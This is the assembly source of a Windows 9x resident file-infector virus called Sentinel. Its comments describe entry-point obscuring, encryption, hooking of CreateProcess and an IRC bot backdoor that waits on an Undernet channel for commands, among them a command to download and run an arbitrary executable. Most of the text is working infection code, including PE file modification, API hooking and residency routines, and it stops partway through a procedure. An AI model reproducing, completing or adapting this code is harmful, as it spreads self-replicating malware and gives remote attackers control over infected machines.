
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[SENTINEL.ASM]컴�
;........................................................................;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;
;                  w9x.Sentinel 1.1 (c)oded 2000 by f0re 
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;
;
; Abstract
; --------
; This is the sourcecode of my first resident  w32 virus. It uses advanced
; EPO (entry point obscuring) and has backdoor capabilities via IRC. 
;
;
; Virus Specification
; -------------------
; When an infected  file is executed  the  decryptor receives  control and
; decrypts  the  virus  with  the  decryption  key  on  the stack (see EPO 
; specification).  Next the  virus  goes  resident  by  using the vxdcall0 
; backdoor and hooks the CreateProcess api by modifying its address in the
; kernel32.dll export table in memory.
;
; When a new process is created the virus routine receives control and, if 
; not already present,  launches a new  thread in which an  IRC bot may be
; started  (see IRC-BOT specification).  Next  it  will  try to infect the 
; executed  file.
;
; The infection procedure consists  globally of the following steps. First
; it  will  search  for a  cavity in the file's code section and if one is
; found, it  laces  there the  JumpVirus  routine (see EPO specification).
; Second it will search for the nth call or jmp opcode in the code section
; to replace it with a call to this routine (again see EPO specification).
; Third  it  will  copy  the  decryptor  to the end of the file. Fourth it
; encrypts  and  copies  the other  portion  of the virus to the file. The 
; encryption key  that is used  is  the offset of the returnaddress of the 
; patched api call/jmp. Finally, after the file is infected,  the original
; CreateProcess api code is executed.
;
;
; EPO specification
; ---------------------
; As already described,  during  infection the  nth api call or (indirect) 
; api jmp opcode in the  code  section of the file  is replaced by a  call
; to the JumpVirus routine (n is a random number). This routine was placed
; in a cavity somewhere  in  the code section. The JumpVirus routine holds
; the following 14 bytes of code:
;
; 	JumpVirusCode:
; 		xxxx = virtual address of JumpToVirusEntryPoint
; 	JumpToVirusEntryPoint:
;		mov eax, [esp]
;		add eax, delta
;		jmp eax
;
; From the stack this routine takes the return address from the call. Next
; a precalculated  number,  called delta, (calculated during infection) is 
; added which gives  the virtual  address of  the  virus entrypoint. After
; jumping to the virusdecryptor code the decryption key is taken from  the
; stack (this is the return address from the call) and  the viruscode  can
; be decrypted. 
;
; For a virusscanner it is now much harder to  decrypt the virus; it first
; needs to find the return address of the api  call  or the address of the
; cavity  and  the  size  of the  virus  or both to be able to decrypt the 
; virus.
;
;
; IRC BOT specification
; ---------------------
; When  the  IRC  routine  is  launched, it  will  try to find an internet
; connection and if one is found, it launches an IRC BOT, ***a sentinel***
; which goes to  undernet #sntnl.  There it  will  sit and wait for remote
; commands. The nickname  of a sentinel consists of a randomly chosen name
; from a  list  of  names  followed  by two random numbers. In the rest of
; this text the name  of a  sentinel is  indicated by xxx.  A sentinel can
; understand a  number  of  commands  which  can  be  send  to  a sentinel
; privately or  to all  sentinels at  once by  sending  the message to the
; channel. The following messages are understood:
;
; * all IRC commands, send with the following stucture:
;
; 	/msg xxx pass /<ircommand> <params>
;       
;	so for example: /msg xxx pass /privmsg #sntnl :hello there
;
; * the installer-command, send with the following structure:
;
;	/msg xxx pass /ex3c [<ipnumber>] [<get-command>]
;
;	where <ipnumber> = ip-number of  server  where  executable  should
;	be downloaded.
;
;	where  <get-command>  =  the exact  command  according to the HTTP 
;	protocol to retrieve the file. 
;
;	So the command may for example look like:
;	
;	/msg xxx pass /ex3c [123.45.67.89] [GET /filename.exe HTTP/1.0]
;
;	If  a  sentinel  receives  this   command  it  will  download  the
;	specified  file. Only  when  the  it  has succesfully received the
;	entire file it will execute the file.
;
; * the status-command, send with the following structure:
;
;	/msg xxx pass /st4t
;
;	If a sentinel receives this command, it  will  show the status  of
;       the installer. Five different statuses are possible:
;	
;	Waiting/Unable to connect/Installing/Size error/Done
;
; * the quit-command, send with the following structure:
;
;	/msg xxx pass /qu1t
;
; * the nick-command, send with the following structure:
;
;	/msg xxx pass /n1ck
;
;	This commands tells a  sentinel  to  change its nick into a random
;	5 character long name.
;
;
; To Compile
; ----------
; tasm32 sentinel.asm /m /ml
; tlink32 -aa sentinel.obj lib\import32.lib
;
;
; Greetz
; ------
; Greetz go  to (in random order):  Blackjack,  Darkman, MrSandman,  Mdrg, 
; Prizzy, Benny,  rgo32,  Asmod,  Lord Julus, Spanska, DrOwlFS, Bumblebee,
; VirusBuster, LifeWire, Gbyte, r-,  veedee, spo0ky,  t00fic  and last but
; not least all the other people from #virus/#vxers.
;
;
;"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""";

.386
.model flat, stdcall

locals
jumps
	extrn ExitProcess:PROC

	include inc\myinc.inc
	include inc\wsocks.inc

.data

    FirstCopy:
	jmp RealStart

    Start:
	mov eax, dword ptr [esp]			; decryption key
	pushad
	call GetCurrentOffset

    GetCurrentOffset:
	pop esi
	add esi, (RealStart - GetCurrentOffset)
	mov ecx, ((Leap - RealStart)/4 + 1)		; size to decrypt

    DecryptVirus:
	xor dword ptr [esi], eax 			; decryption routine
	add esi, 04h
	loop DecryptVirus

    DecryptionDone:
	popad

    RealStart:
	push ebp
	call GetDeltaOffset

    GetDeltaOffset:
	pop ebp
	sub ebp, offset GetDeltaOffset
	
    SetSEH:
	lea eax, [ebp + ErrorHandler]			; set new SEH handler
	push eax
	push dword ptr fs:[0]				; save old SEH handler
	mov dword ptr fs:[0], esp			; initiate SEH frame

    CheckWindowsVersion:
	mov eax, [ebp + kernel32address]
	cmp word ptr [eax], 'ZM'
	jne ErrorHandler
	add eax, [eax + 3ch]
	cmp word ptr [eax], 'EP'
	jne ErrorHandler

    RestoreSEH:
	pop dword ptr fs:[0]				; restore old SEH		
	add esp, 4					; handler
	jmp MainRoutines

    ErrorHandler:
	mov esp, [esp + 8]				
	pop dword ptr fs:[0]					
	add esp, 4					
	jmp CheckEpoType

    MainRoutines:
	pushad
	call FIND_GETPROCADDRESS_API_ADDRESS	
	call FIND_VXDCALL0_ADDRESS
	call FIND_USER32_BASE_ADDRESS
	call GO_RESIDENT
	popad						

    CheckEpoType:
	cmp [ebp + epo_opcode], 15FFh
	jne EpoJmpExit

    EpoCallExit:
    	mov eax, [ebp + epo_awaa_va]		; [eax]-> va original jmp
	pop ebp
	jmp [eax]	

    EpoJmpExit:
    	mov eax, [ebp + epo_awaa_va]		; [eax]-> va original jmp
	mov [esp + 4], eax
	pop ebp
	pop eax					
	jmp [eax]	

;==============================[ includes ]==============================;


	hookstruct			db 20d dup(0)
	zip				db "zip",0
	delta				dd 00h
	cs_rawsize			dd 00h
	cavity_va			dd 00h

	page_mem_size			equ ((Leap-Start) + 0fffh)/1000h
	resaddress			dd 0
	kernel32address 		dd 0bff70000h
	user32address			dd 0
	wsock32address			dd 0
	imagehlpaddress			dd 0

	cp_oldapicodeaddress		dd 0
	cp_newapicodeaddress		dd 0
	cp_oldapicode			db 06h dup(0)
	cp_newapicode			db 06h dup(0)
    
	k32 				db "KERNEL32.dll",0
	user32 				db "USER32.dll",0
	imagehlp			db "IMAGEHLP.dll",0
  
	numberofnames 			dd 0
	addressoffunctions 		dd 0
	addressofnames 			dd 0
	addressofordinals 		dd 0
	AONindex 			dd 0

	AGetProcAddress 		db "GetProcAddress", 0	
	AGetProcAddressA 		dd 0			
	AMessageBox 			db "MessageBoxA",0
	AMessageBeep 			db "MessageBeep",0
	AGetSystemTime			db "GetSystemTime",0
	AFindFirstFile 			db "FindFirstFileA",0
	ACreateFile			db "CreateFileA",0
	ASetCurrentDirectory 		db "SetCurrentDirectoryA",0
	ASetFileAttributes 		db "SetFileAttributesA",0
	AGetFileAttributes 		db "GetFileAttributesA",0
	ACreateFileMapping 		db "CreateFileMappingA",0
	AMapViewOfFile 			db "MapViewOfFile",0
	AUnmapViewOfFile 		db "UnmapViewOfFile",0
	ACloseHandle 			db "CloseHandle",0
	ASetFilePointer 		db "SetFilePointer",0
	ASetEndOfFile 			db "SetEndOfFile",0
	AGetModuleHandle 		db "GetModuleHandleA",0
	ASetFileTime 			db "SetFileTime",0
	ALoadLibrary 			db "LoadLibraryA",0
	AGetSystemDirectory 		db "GetSystemDirectoryA",0
	AGetWindowsDirectory		db "GetWindowsDirectoryA",0
	AGetFileSize 			db "GetFileSize",0
	AGetCurrentDirectory		db "GetCurrentDirectoryA",0
	AVxdcall0A			dd 0
	ACheckSumMappedFile		db "CheckSumMappedFile",0

	filenamebuffer			db 100h dup(0)
     	
	maphandle 			dd 0
	mapaddress 			dd 0
	memory 				dd 0
	imagebase 			dd 0
	imagesize 			dd 0
	filealign 			dd 0
	sectionalign 			dd 0
	filehandle			dd 0
	filesize			dd 0
	PEheader 			dd 0
	ip_original			dd offset OriginalHost 

	windowtitle 			db "W9x.Sentinel", 0
	msgtxt	 			db "Observing the world f0revir", 0

	myseh				SEH <>
	myfinddata 			WIN32_FIND_DATA <>
	rva2raw				dd 0
	debug				db 01

	epo_newip			dd 0
	epo_cs_rva			dd 0
	epo_cs_pa			dd 0
	epo_ipnew_va			dd 0
	epo_ipnew_rva			dd 0
	epo_opcode			dw 15ffh
	epo_aoc_pa			dd 0
	epo_awaa_va			dd offset ip_original 

        string 				db "ZZZZZZZZ", 0
	ascvalues 			db "0123456789ABCDEF", 0

FIND_GETPROCADDRESS_API_ADDRESS proc
	
    LoadExportTableData:
    	mov edi, [ebp + kernel32address]		; get exporttable
	add edi, [edi + 3ch]				; address from
    	mov esi, [edi + 78h]				; kernel's PE header
	add esi, [ebp + kernel32address]		
    	
	mov eax, dword ptr [esi + 18h]			
	mov [ebp + numberofnames], eax			; save number of names
		
	mov eax, dword ptr [esi + 1Ch]			; get ra of table with 
    	add eax, [ebp + kernel32address]		; pointers to funtion
    	mov [ebp + addressoffunctions], eax		; addresses

	mov eax, dword ptr [esi + 20h]			; get ra of table with
    	add eax, [ebp + kernel32address]		; pointers to names
    	mov [ebp + addressofnames], eax			; of functions
	
	mov eax, dword ptr [esi + 24h]			; get ra of table with
	add eax, [ebp + kernel32address]		; pointers to ordinals
	mov [ebp + addressofordinals], eax		; of functions

    BeginProcAddressSearch:
    	mov esi, [ebp + addressofnames]			; search for GetProc
    	mov [ebp + AONindex], esi			; Address API in names
    	mov edi, [esi]					; table
    	add edi, [ebp + kernel32address]	
	xor ecx, ecx					
    	lea ebx, [ebp + AGetProcAddress]		

    TryAgain:
    	mov esi, ebx					

    MatchByte:
    	cmpsb
    	jne NextOne					
    	cmp byte ptr [esi], 0				; did the entire string
    	je GotIt					; match ?
    	jmp MatchByte

    NextOne:
    	inc cx						
    	add dword ptr [ebp + AONindex], 4		; get next namepointer
    	mov esi, [ebp + AONindex]			; in table (4 dwords)
    	mov edi, [esi]					
    	add edi, [ebp + kernel32address]		; align with kernelbase
    	jmp TryAgain

    GotIt:
    	shl ecx, 1					
    	mov esi, [ebp + addressofordinals]		; ordinal = nameindex *
    	add esi, ecx					; size of ordinal entry
    	xor eax, eax					; + ordinal table base
    	mov ax, word ptr [esi]				
    	shl eax, 2					; address of function =
    	mov esi, [ebp + addressoffunctions]		; ordinal * size of
    	add esi, eax					; entry of address 
    	mov edi, dword ptr [esi]			; table + base of 
    	add edi, [ebp + kernel32address]		; addresstable
    	mov [ebp + AGetProcAddressA], edi		; save GPA address
	ret	
  
FIND_GETPROCADDRESS_API_ADDRESS endp

FIND_VXDCALL0_ADDRESS proc

    FindStartOfKernelExportSection:
	mov esi, [ebp + kernel32address]
	add esi, dword ptr [esi + 3ch]
	mov edi, dword ptr [esi + 78h]		; virtual address of kernel32
	add edi, [ebp + kernel32address]	; export section

    GetVXDCallAddress:
	mov esi, dword ptr [edi + 1Ch]		; get ra of table with 
    	add esi, [ebp + kernel32address]	; pointers to funtion addresses
	mov eax, dword ptr [esi]
	add eax, [ebp + kernel32address]
	mov [ebp + AVxdcall0A], eax
	ret

FIND_VXDCALL0_ADDRESS endp

GETAPI proc 

	push eax					
	push dword ptr [ebp + kernel32address]		; load kernelbase
	call [ebp + AGetProcAddressA]			; and get api address
	jmp eax						; call the api
	ret						; return
	 
GETAPI endp

GETUAPI proc

	push eax					
	push dword ptr [ebp + user32address]		; load user32base
	call [ebp + AGetProcAddressA]			; and get api address
	jmp eax
	ret

GETUAPI endp

GETWAPI proc

	push eax					
	push dword ptr [ebp + wsock32address]		; load wsockbase
	call [ebp + AGetProcAddressA]			; and get api address
	jmp eax
	ret

GETWAPI endp

GETIAPI proc

	push eax					
	push dword ptr [ebp + imagehlpaddress]	
	call [ebp + AGetProcAddressA]		
	jmp eax
	ret

GETIAPI endp

GO_RESIDENT proc

    CheckResidency:
	mov eax, [ebp + kernel32address]
	add eax, 400h
	cmp dword ptr [eax], 'er0f'
	je MemoryError					; already resident

    PageReserve:
	push 00020000h or 00040000h
	push page_mem_size
	push 80060000h
	push 00010000h
	call dword ptr [ebp + AVxdcall0A]		
	cmp eax, 0FFFFFFFh
	je MemoryError
	mov [ebp + resaddress], eax

    CalculateVirusVirtualAddress:
	mov ecx, offset InterceptCP - Start
	add ecx, eax
	mov [ebp + cp_newapicodeaddress], ecx

    PageCommit:
	push 00020000h or 00040000h or 80000000h or 00000008h
	push 00000000h
	push 00000001h
	push page_mem_size
	shr eax, 12
	push eax
	push 00010001h
	call dword ptr [ebp + AVxdcall0A]		
	or eax, eax
	je MemoryError

	; IN: hookstruct:
	;	00 : offset api name
	;	04 : old apicodeaddress
	;	08 ; offset for old apicode
	;	12 ; offset for new apicode
	;	16 : new apicodeaddress

	lea eax, [ebp + hookstruct]
	lea ebx, [ebp + ACreateProcess]
	mov dword ptr [eax], ebx
	lea ebx, [ebp + cp_oldapicodeaddress]
	mov dword ptr [eax + 4], ebx
	lea ebx, [ebp + cp_oldapicode]
	mov dword ptr [eax + 8], ebx
	lea ebx, [ebp + cp_newapicode]
	mov dword ptr [eax + 12], ebx
	lea ebx, [ebp + cp_newapicodeaddress]
	mov dword ptr [eax + 16], ebx
	call HOOK_API

    CopyVirusToMemory:	
	cld
	lea esi, [ebp + Start]
	mov edi, [ebp + resaddress]
	mov ecx, Leap-Start
	rep movsb
 
    SetResidentFlag:
	mov eax, [ebp + kernel32address]
	add eax, 400h
	shr eax, 12d

    ModifyPagePermissions2:
	push 20060000h
	push 00000000h
	push 00000001h
	push eax
	push 0001000dh
	call dword ptr [ebp + AVxdcall0A]	
	cmp eax, 0FFFFFFFh
	je MemoryError

	mov eax, [ebp + kernel32address]
	add eax, 400h
	mov dword ptr [eax], 'er0f'

    MemoryError:
	ret

GO_RESIDENT endp

INFECT_FILE proc

     SetFileAttributesToNormal:
	push 80h	
	lea esi, [ebp + myfinddata.fd_cFileName]	; esi = filename	
	push esi
	lea eax, [ebp + ASetFileAttributes]	
	call GETAPI
	
     OpenFile:
	push 0						; template handle=0
	push 20h					; attributes=any file
	push 3						; type= existing file
	push 0						; security option = 0
	push 1						; shared for read
	push 80000000h or 40000000h			; generic read write
	lea esi, [ebp + filenamebuffer]
	push esi					; offset file name
	lea eax, [ebp + ACreateFile]
	call GETAPI

	cmp eax, 0FFFFFFFFh
	je InfectionError
	mov [ebp + filehandle], eax

;-------------------------------[ map file ]---------------------------------;

    CreateFileMapping:					; allocates the memory
	push 0						; filename handle = 0
	push [ebp + memory]				; max size = memory
	push 0						; minumum size = 0
	push 4						; read / write access
	push 0						; sec. attrbs= default
	push [ebp + filehandle]
	lea eax, [ebp + ACreateFileMapping]
	call GETAPI					; eax = new map handle

	mov [ebp + maphandle], eax
	or eax, eax
	jz CloseFile					

    MapViewOfFile:
	push [ebp + memory]				; memory to map
	push 0						; file offset
	push 0						; file offset
	push 2						; file map write mode
	push eax					; file map handle
	lea eax, [ebp + AMapViewOfFile]			; ok map the file
	call GETAPI
	or eax, eax
	jz CloseMap
	mov [ebp + mapaddress], eax			; save that base

    CheckForMZMark:
	cmp word ptr [eax], 'ZM'			; an exe file?
	jne UnmapView	

    CheckInfectionMark:
	cmp word ptr [eax + 38h], 'll'			; already infected?
	je UnmapView	

    NotYetInfected:
	mov esi, dword ptr [eax + 3ch]			
	cmp esi, 200h
	ja UnmapView
	add esi, eax
	cmp dword ptr [esi], 'EP'			; is it a PE file ?
	jne UnmapView
	mov [ebp + PEheader], esi			; save va PE header
	mov eax, [esi + 28h]
	mov [ebp + ip_original], eax			; save original ip	
	mov eax, [esi + 34h]
	mov [ebp + imagebase], eax			; save imagebase
	
;------------------------------[ append section ]----------------------------;

    CheckForEPO:
	pushad
	mov [ebp + epo_opcode], 15FFh			; search for call opcode
	call CREATE_EPO
	or eax, eax
	jnz LocateBeginOfLastSection
	mov [ebp + epo_opcode], 25FFh
	call CREATE_EPO
	or eax, eax
	jnz LocateBeginOfLastSection
	popad
	jmp UnmapView

    LocateBeginOfLastSection:
	popad
	movzx ebx, word ptr [esi + 20d]			; optional header size
	add ebx, 24d					; file header size
	movzx eax, word ptr [esi + 6h]			; no of sections
	dec eax						; (we want the last-1
	mov ecx, 28h					; sectionheader)
	mul ecx						; * header size
	add esi, ebx					; esi = begin of last 
	add esi, eax					; section's header

    CheckForOverLays:
	mov eax, [esi + 10h]				; section phys size
	add eax, [esi + 14h]				; section phys offset
	mov ecx, [ebp + PEheader]
	mov ecx, [ecx + 38h]
	div ecx
	inc eax
	mul ecx
	mov ecx, [ebp + filesize]
	cmp ecx, eax
	ja UnmapView					; we dont infect those
	mov ecx, 08h

    CheckForZipSFX:
	lea edi, [ebp + zip]
	push ecx
	push esi
	mov ecx, 03h
	rep cmpsb
	pop esi
	pop ecx
	je UnmapView
	inc esi
	loop CheckForZipSFX

    ChangeLastSectionHeaderProperties:
	sub esi, 08h
	or dword ptr [esi + 24h], 00000020h or 20000000h or 80000000h 

    NewAlignedPhysicalSize:
	mov eax, [esi + 8h]				; old virt size
	add eax, Leap-Start
	mov ecx, [ebp + PEheader]
	mov ecx, [ecx + 3ch]
	div ecx						; and align it to
	inc eax						; the filealign
	mul ecx
	mov [esi + 10h], eax  			; save it

    NewAlignedVirtualSize:
	mov eax, [esi + 8h]				; get old 
	push eax					; store it
	add eax, Leap-Start				
	mov ecx, [ebp + PEheader]
	mov ecx, [ecx + 38h]
	div ecx						; and align it to
	inc eax						; the sectionalign
	mul ecx
	mov [esi + 8h], eax				; save new value

    NewAlignedImageSize:
	mov eax, dword ptr [esi + 0ch]			; get virtual offset	
	add eax, dword ptr [esi + 8h]			; + new virtual size
	mov [ebp + imagesize], eax			; = new imagesize

    NewAlignedFileSize:
	mov eax, dword ptr [esi + 10h]			; get new phys size
	add eax, dword ptr [esi + 14h]			; add offset of phys
	mov [ebp + filesize], eax			; size = filesize

    CalculateNewIp:
	pop eax
	push eax	
	add eax, dword ptr [esi + 0ch]			; + virtual offset
	mov [ebp + epo_ipnew_rva], eax			; new ip

    CreateEpoIp:
	add eax, [ebp + imagebase]
	mov [ebp + epo_ipnew_va], eax

    CalculateEncryptionKey:
	mov ebx, [ebp + epo_aoc_pa]
	sub ebx, [ebp + epo_cs_pa]
	add ebx, [ebp + epo_cs_rva]
	add ebx, 04h					; ebx-> original return address
	add ebx, [ebp + imagebase]			; after call = encryption key

    CalculateDelta:
	mov eax, [ebp + epo_ipnew_va]
	sub eax, ebx		
	mov [ebp + delta], eax

    CopyVirusDecryptorToEndOfFile:
	pop eax
	mov edi, eax					; virtual size
	add edi, [ebp + mapaddress]			; mapaddress
	add edi, [esi + 14h]				; add raw data offset
	lea esi, [ebp + Start]				; copy virus
	mov ecx, (RealStart - Start)
	rep movsb

    PrepareToEncryptAndCopy:
	mov ecx, ((Leap-RealStart)/4 + 1)
	cld

    EncryptAndCopyVirus:
	movsd
	sub edi, 04h
	xor dword ptr [edi], ebx
	add edi, 04h
	loop EncryptAndCopyVirus

    SearchForCavity:
	mov esi, [ebp + epo_cs_pa]
	mov ecx, [ebp + cs_rawsize]
	call CAVITYSEARCH				
	or esi, esi
	jz UpdatePEHeaderWithChanges
	mov eax, esi
	sub eax, [ebp + epo_cs_pa]
	add eax, [ebp + epo_cs_rva]
	add eax, [ebp + imagebase]
	mov [ebp + cavity_va], eax

    WriteVirusJumpIntoCavity:
	add eax, 04h
	mov dword ptr [esi], eax
	add esi, 04h
	mov dword ptr [esi], 0524048Bh
	add esi, 04h
	mov eax, [ebp + delta]
	mov dword ptr [esi], eax
	add esi, 04h
	mov word ptr [esi], 0E0FFh
	
    SetEpo:
	mov eax, [ebp + cavity_va]
	mov edx, [ebp + epo_aoc_pa]
	mov dword ptr [edx], eax
	sub edx, 02h
	mov word ptr [edx], 15FFh			; turn jmp into call
	
    UpdatePEHeaderWithChanges:
	mov esi, [ebp + mapaddress]	
	mov word ptr [esi + 38h], 'll'			; set infectionmark
	mov esi, [ebp + PEheader]	
	mov eax, [ebp + imagesize]		
	mov [esi + 50h], eax				; set new imagesize

    CalculateNewCheckSum:
	cmp dword ptr [esi + 58h], 00h
	je UnmapView

    LoadImageHlpDll:
	lea eax, [ebp + imagehlp]
	push eax
	lea eax, [ebp + ALoadLibrary]
	call GETAPI
	or eax, eax
	jz UnmapView
	mov [ebp + imagehlpaddress], eax

    CalculateNewChecksum:
	mov esi, [ebp + PEheader]	
	push dword ptr [esi + 58h]
	lea eax, [ebp + buffer]
	push eax
	push dword ptr [ebp + filesize]
	push dword ptr [ebp + mapaddress]
	lea eax, [ebp + ACheckSumMappedFile]
	call GETIAPI

;--------------------------------[ unmap file ]------------------------------;

    UnmapView:
	push dword ptr [ebp + mapaddress]
	lea eax, [ebp + AUnmapViewOfFile]
	call GETAPI

    CloseMap:
	push dword ptr [ebp + maphandle]
	lea eax, [ebp + ACloseHandle]
	call GETAPI

  	push 0					; set file pointer to 
	push 0					; beginning + filesize
	push [ebp + filesize]			; = end of file
	push [ebp + filehandle]
	lea eax, [ebp + ASetFilePointer]
	call GETAPI

	push [ebp + filehandle]			; set EOF equal to current
	lea eax, [ebp + ASetEndOfFile]		; filepointer position
	call GETAPI

;--------------------------------[ close file ]------------------------------;

    CloseFile:
	push dword ptr [ebp + myfinddata.fd_ftLastWriteTime]
	push dword ptr [ebp + myfinddata.fd_ftLastAccessTime]
	push dword ptr [ebp + myfinddata.fd_ftCreationTime]
	push dword ptr [ebp + filehandle]
	lea eax, [ebp + ASetFileTime]
	call GETAPI

	push [ebp + filehandle]
	lea eax, [ebp + ACloseHandle]
	call GETAPI

    InfectionError:
	push dword ptr [ebp + myfinddata.fd_dwFileAttributes]
	lea eax, [ebp + myfinddata.fd_cFileName]	
	push eax
	lea eax, [ebp + ASetFileAttributes]
	call GETAPI
	ret

INFECT_FILE endp

RESIDENT_CP proc 

     InterceptCP:
	pushad
	call GetApiDelta

     GetApiDelta:
	pop ebp
	sub ebp, offset GetApiDelta
	call FIND_GETPROCADDRESS_API_ADDRESS
	call FIND_USER32_BASE_ADDRESS
	call RESIDENT_CP2
	call IRC_LAUNCH
	popad

     GetNewDelta:
	call NewDelta

     NewDelta:
	pop eax
	sub eax, offset NewDelta

     RestoreApiCode:
	pushad
	mov edi, [eax + cp_oldapicodeaddress]			
	lea esi, [eax + cp_oldapicode]
	mov ecx, 06h
	rep movsb
	popad

	pop [eax + returnaddress]
	call dword ptr [eax + cp_oldapicodeaddress]

     ReHookApi:
	pushad
	call GetNewDelta2

     GetNewDelta2:
	pop ebp
	sub ebp, offset GetNewDelta2

	mov edi, [ebp + cp_oldapicodeaddress]			
	lea esi, [ebp + cp_newapicode]
	mov ecx, 06h
	rep movsb
	popad

     ReturnToOriginalCaller:
	db 68h
	returnaddress dd 0
	ret

RESIDENT_CP endp

RESIDENT_CP2 proc

    CheckForEmptyCommandLine:
	mov esi, dword ptr [esp + 2ch]
	or esi, esi
	jz Continue
                             
    ExtractFileName:
	xor ecx, ecx
	cmp byte ptr [esi], '"'			
	jne FileNameNormal
	inc esi
	push esi

    GetFileNamePartBetweenQuotes:
	cmp byte ptr [esi], '"'
	je GetBetweenQuotes
	inc esi
	inc ecx
	cmp ecx, 100h
	ja FileNameEndNotFound
	jmp GetFileNamePartBetweenQuotes
	
    GetBetweenQuotes:
	mov edi, esi
	pop esi
	sub edi, esi				; esi hold start of filename
	mov ecx, edi				; ecx holds size of filename
	jmp StoreFileName

    FileNameNormal:
	push esi

    GetNormalFileName:
	cmp byte ptr [esi], ' '
	je FoundNormalFileName
	inc esi
	inc ecx
	cmp ecx, 100h
	ja FileNameEndNotFound
	jmp GetNormalFileName

    FoundNormalFileName:
	mov edi, esi
	pop esi
	sub edi, esi				; esi hold start of filename
	mov ecx, edi				; ecx holds size of filename
	jmp StoreFileName
	
    FileNameEndNotFound:
	pop esi
	jmp Continue

    StoreFileName:
	push edi
	push esi
	push ecx

	mov ecx, 100h
	xor eax, eax
	lea edi, [ebp + filenamebuffer]
	rep stosb

	pop ecx
	pop esi
	pop edi

	lea edi, [ebp + filenamebuffer]
	rep movsb

    CheckForRem:
	lea esi, [ebp + filenamebuffer]
	cmp word ptr [esi], 'er'
	jne FindFirstFile
	inc esi
	cmp word ptr [esi], 'me'
	je Continue

    FindFirstFile:
	lea eax, [ebp + myfinddata]			; win32 finddata structure
	push eax
	lea eax, [ebp + filenamebuffer]
	push eax
	lea eax, [ebp + AFindFirstFile]			; find the file
	call GETAPI
	cmp eax, 0FFFFFFFFh				; file was not found
	je Continue

	cmp [ebp + debug], 00h
	je InfectThisFile
	xor ecx, ecx
	lea esi, [ebp + myfinddata.fd_cFileName]

    CheckFileName:
	cmp byte ptr [esi], 0
	je Continue
	cmp dword ptr [esi], 'mmud'
	je InfectThisFile
	inc esi
	inc ecx
	cmp ecx, 100h
	ja Continue
	jmp CheckFileName

    InfectThisFile:
	mov ecx, [ebp + myfinddata.fd_nFileSizeLow]	; ecx = filesize
	mov [ebp + filesize], ecx			; save the filesize
	add ecx, Leap - Start + 1000h			; filesize + virus
	mov [ebp + memory], ecx				; + workspace = memory

	call INFECT_FILE

    Continue:
	ret

RESIDENT_CP2 endp

HOOK_API proc 

	; IN: hookstruct:
	;	00 : offset api name
	;	04 : old apicodeaddress
	;	08 ; offset for old apicode
	;	12 ; offset for new apicode
	;	16 : new apicodeaddress
		
    FindKernelExportTable:
	pushad
	mov edi, [ebp + kernel32address]
	add edi, dword ptr [edi + 3ch]
	mov esi, dword ptr [edi + 78h]
	add esi, [ebp + kernel32address]
   
    GetNecessaryData:
	mov eax, dword ptr [esi + 18h]			
	add eax, [ebp + kernel32address]
	mov [ebp + numberofnames], eax			; save number of names
	mov eax, dword ptr [esi + 1Ch]			; get ra of table with 
	add eax, [ebp + kernel32address]
	mov [ebp + addressoffunctions], eax		; function addresses
	mov eax, dword ptr [esi + 20h]			; get ra of table with
	add eax, [ebp + kernel32address]
    	mov [ebp+addressofnames],  eax			; pointers to names 
	mov eax, dword ptr [esi + 24h]			; get ra of table with
	add eax, [ebp + kernel32address]
	mov [ebp+addressofordinals], eax		; pointers to ordinals

    BeginApiAddressSearch:
    	mov esi, [ebp + addressofnames]			; search for 
    	mov [ebp + AONindex], esi			; API in names
    	mov edi, [esi]					; table
	add edi, [ebp + kernel32address]
	
    HookCreateProcess:
	xor ecx, ecx

    OkTryAgain:
	lea ebx, [ebp + hookstruct]
	mov esi, dword ptr [ebx]

    MatchByteNow:
    	cmpsb
    	jne NextOneNow					
    	cmp byte ptr [esi], 0				; did the entire string
    	je YesGotIt					; match ?
    	jmp MatchByteNow

    NextOneNow:
    	inc cx						
    	add dword ptr [ebp + AONindex], 4		; get next namepointer
    	mov esi, [ebp + AONindex]			; in table (4 dwords)
    	mov edi, [esi]
	add edi, [ebp + kernel32address]					
    	jmp OkTryAgain

    YesGotIt:
    	shl ecx, 1					
    	mov esi, [ebp + addressofordinals]		; ordinal = nameindex *
    	add esi, ecx					; size of ordinal entry
    	xor eax, eax					; + ordinal table base
    	mov ax, word ptr [esi]				; offset of address
    	shl eax, 2					; of function = ordinal
    	mov esi, [ebp + addressoffunctions]		; * size of entry of
    	add esi, eax					; address table
    	mov edi, dword ptr [esi]			; get address
	add edi, [ebp + kernel32address]

	lea eax, [ebp + hookstruct]
	mov eax, dword ptr [eax + 4]
	mov dword ptr [eax], edi

    SetApiHook:
	mov eax, edi
	shr eax, 12d

    ModifyPagePermissions:
	push 20060000h
	push 00000000h
	push 00000001h
	push eax
	push 0001000dh
	call dword ptr [ebp + AVxdcall0A]	

	cmp eax, 0FFFFFFFh
	jne SaveCreateProcessApiCode
	xor eax, eax
	jmp ApiHookError

    SaveCreateProcessApiCode:
	lea esi, [ebp + hookstruct]
	mov esi, dword ptr [esi + 4]
	mov esi, dword ptr [esi]
	lea edi, [ebp + hookstruct]
	mov edi, dword ptr [edi + 8]
	mov ecx, 06h
	rep movsb

    PrepareCreateProcessApiCode:
	lea esi, [ebp + hookstruct]
	mov esi, dword ptr [esi + 12]
	mov byte ptr [esi], 68h
	inc esi
	lea eax, [ebp + hookstruct]
	mov eax, dword ptr [eax + 16]
	mov eax, dword ptr [eax]
	mov dword ptr [esi], eax
	add esi, 04h
	mov byte ptr [esi], 0c3h

    ChangeCreateProcessApiCode:
	lea edi, [ebp + hookstruct]
	mov edi, dword ptr [edi + 4]
	mov edi, dword ptr [edi]
	lea esi, [ebp + hookstruct]
	mov esi, dword ptr [esi + 12]
	mov ecx, 06h
	rep movsb

    ApiHookError:
	popad
	ret
   
HOOK_API endp

CREATE_EPO proc

    LocateCodeSectionHeader:
	mov eax, [ebp + ip_original]
	call FIND_SECTION
	or eax, eax
	jz ExitEpoRoutine

	; edi = start of code section header
	
    GetPointerToRawData:
	mov eax, dword ptr [edi + 12d]			; eax = rva cs
	mov [ebp + epo_cs_rva], eax

	mov ecx, dword ptr [edi + 16d]			; raw size of code section
	mov [ebp + cs_rawsize], ecx
